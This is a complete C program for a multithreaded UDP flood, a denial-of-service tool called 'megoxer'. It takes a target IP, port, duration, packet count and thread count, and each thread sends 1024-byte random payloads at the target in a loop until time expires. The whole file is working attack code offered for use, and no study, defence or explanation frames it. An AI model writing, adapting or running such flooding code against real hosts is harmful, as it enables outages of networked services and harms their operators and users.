#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./megoxer <ip> <port> <time> <packets> <threads>\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
    int packets;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    // Allocate a buffer for each packet (1024 bytes)
    char payload[1024];

    // Fill the payload with random data
    for (int i = 0; i < sizeof(payload); i++) {
        payload[i] = rand() % 256; // Random byte value (0-255)
    }

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < data->packets; i++) {
            if (sendto(sock, payload, sizeof(payload), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int packets = atoi(argv[4]);
    int threads = atoi(argv[5]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));

    printf("Flood started on %s:%d for %d seconds with %d bytes and %d threads\n", ip, port, time, packets, threads);

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->time = time;
        data->packets = packets;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("✅ Attack finished\n");
    return 0;
}